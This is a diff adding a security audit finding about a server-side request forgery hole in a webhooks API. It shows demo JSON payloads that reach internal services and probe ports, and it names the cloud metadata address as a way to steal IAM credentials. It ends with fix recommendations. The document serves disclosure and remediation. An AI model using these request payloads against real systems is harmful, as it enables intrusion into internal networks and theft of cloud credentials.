@@ -1,0 +1,34 @@
+V-14 — Server-Side Request Forgery (SSRF) in POST /api/v1/webhooks
+
+Root cause: webhooks/routes.js performs a fetch() on user-supplied URL
+without validating scheme, host, or resolved IP.
+
+Demo 1 — Reach internal mock-llm service
+  POST /webhooks {"url":"http://mock-llm:4000/ssrf-target"}
+  → 200 {"status":200, "body_preview": "{\n \"path\": \"/ssrf-target\""}
+  → mock-llm logs show request from 172.18.0.3 (LendStack internal IP)
+
+Demo 2 — Reach internal fluent-bit metrics
+  POST /webhooks {"url":"http://fluent-bit:2020/api/v1/metrics"}
+  → 200 {"status":200, "body_preview": "{\n \"fluentbit_input_records_total\""}
+  (after enabling HTTP_Server in fluent-bit.conf)
+
+Demo 3 — Port scanning (blind)
+  POST /webhooks {"url":"http://postgres:5432"}
+  → {"error":"fetch failed"} (non-HTTP port)
+  POST /webhooks {"url":"http://postgres:9999"}
+  → {"error":"fetch failed"} (closed port)
+
+Impact:
+  - Access to internal services not exposed to the internet (mock-llm,
+    fluent-bit, postgres, any future internal admin panel).
+  - Cloud metadata theft (e.g., http://169.254.169.254/) → IAM credentials.
+  - Internal port scanning via error/timing oracles.
+
+Fix (M8):
+  Use an egress proxy or strict URL validation.
+  - Block non-HTTP(S) schemes.
+  - Resolve DNS and block private IPs (RFC 1918, loopback, link-local).
+  - Block 169.254.169.254 (cloud metadata).
+  - Use a separate, heavily firewalled service to make outbound webhook
+    calls, so even if SSRF hits it, it can't reach the internal network.
